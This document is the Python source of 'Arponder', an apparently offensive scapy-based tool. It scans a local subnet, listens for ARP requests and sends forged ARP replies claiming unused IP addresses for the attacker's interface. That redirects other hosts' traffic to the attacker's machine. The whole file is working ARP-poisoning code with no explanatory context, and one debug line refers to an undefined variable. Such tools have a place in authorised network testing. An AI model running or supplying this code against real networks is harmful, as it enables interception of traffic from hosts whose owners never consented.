from scapy.all import sniff, ARP, get_if_hwaddr, get_if_addr, srp, Ether, sendp
from colorama import Fore

class Arponder():
    def __init__(self, main_iface: str, analyze_only=False, debug=False):
        self.main_iface = main_iface
        self.debug = debug
        self.analyze_only = analyze_only
        self.active_hosts = {}

        # Add given interface to active hosts
        self.active_hosts[self.main_iface.main_ip] = self.main_iface.main_interface_mac

    def start_listener(self):
        """
        ARP Scan the local network and starts sniffing ARP
        packets on the specified network interface.

        Will run until manually stopped (e.g., Ctrl+C).
        """
        self.__scan_local_subnet()

        print(f"[-] Starting ARP listener on {self.main_iface.main_iface}")
        sniff(iface=self.main_iface.main_iface, filter="arp", prn=self.__arp_callback, store=0)

    def __arp_callback(self, packet):
        """Private method to handle each ARP packet as it's captured."""

        if packet[ARP].op in (1, 2):
            if packet[ARP].op == 1 and packet[ARP].hwsrc != self.main_iface.main_interface_mac:
                # ARP Request (who-has)
                source_mac = packet[ARP].hwsrc
                requested_ip = packet[ARP].pdst
                if self.debug:
                    print(f"  [-] ARP request from {source_mac} for {requested_ip}")

                # Poison if not in analyze_only mode
                if (not self.analyze_only) and (requested_ip not in self.active_hosts) and (requested_ip not in self.main_iface.added_ips):
                    requestor_ip = packet[ARP].psrc

                    # Add IP to iface
                    self.main_iface.add_ip(ip_address=requested_ip)

                    # Send poisoned ARP response
                    requestor_ip = packet[ARP].psrc
                    source_mac = packet[ARP].hwsrc
                    poison_reply = Ether(dst=source_mac)/ARP(
                        op=2,
                        psrc=requested_ip,
                        hwsrc=self.main_iface.main_interface_mac,
                        pdst=requestor_ip,
                        hwdst=source_mac
                    )
                    sendp(poison_reply, iface=self.main_iface.main_iface, verbose=0)

            else:
                # ARP Reply (is-at)
                from_mac = packet[ARP].hwsrc
                to_mac = packet[ARP].hwdst
                requested_ip = packet[ARP].psrc

                if requested_ip in self.main_iface.added_ips:
                    sender_ip = [ip for ip, mac in self.active_hosts.items() if mac == to_mac][0]

                    if from_mac == self.main_iface.main_interface_mac:
                        print(f"  [+] Sent poisoned ARP response to {sender_ip} for {requested_ip}")
                    else:
                        # Someone else must be online at an IP we are poisoning!
                        print(f"  [!] Unexprected ARP reply for {requested_ip}! Removing from poisoning list!")
                        self.active_hosts[requested_ip] = from_mac
                        self.main_iface.remove_ip(requested_ip)

                elif requested_ip not in self.active_hosts:
                    self.active_hosts[requested_ip] = from_mac
                    if self.debug:
                        print(f"  [+] Host {responding_ip} is now alive at {from_mac}")

    def __scan_local_subnet(self):
        """Scans the local subnet for active hosts using ARP."""

        print(f"[-] Scanning network: {self.main_iface.main_network} for active hosts...")
        answered, unanswered = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(self.main_iface.main_network)),
            timeout=2,
            iface=self.main_iface.main_iface,
            verbose=0
        )

        # Parse discovered hosts
        for snd, rcv in answered:
            responding_ip = rcv.psrc
            responding_mac = rcv.hwsrc

            if responding_ip not in self.active_hosts:
                self.active_hosts[responding_ip] = responding_mac

            if self.debug:
                print(f"  [+] Host {responding_ip} is alive at {responding_mac}")

        print(f"  [+] Found {len(self.active_hosts)} hosts online in {self.main_iface.main_network}")
        return